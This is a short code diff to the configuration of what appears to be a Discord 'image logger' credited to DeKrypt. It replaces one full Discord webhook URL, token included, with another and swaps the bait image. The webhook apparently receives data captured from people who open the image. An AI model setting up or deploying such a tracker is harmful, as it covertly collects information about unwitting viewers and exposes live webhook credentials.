@@ -10,8 +10,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discordapp.com/api/webhooks/1366106764222795927/IMWCWyTZCDzXxfq0npJ2SCp53lz9AY2csWKtl0HRxEST08Ao2Ttu27p_cgw8qy-wTPqE",
-    "image": "https://www.skincancer.org/wp-content/uploads/Poop-emoji-scaled.jpg", # You can also have a custom image by using a URL argument
+    "webhook": "https://discordapp.com/api/webhooks/1366118791318208645/XBHzAznsL816pxBPOyMK1SRbkXOEME_bY2utVKE9EaRBVbZNPUg-7_DX9Lw2MvmJrHS2",
+    "image": "https://images.techhive.com/images/article/2014/04/windows-xp-bliss-desktop-image-100259888-orig.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
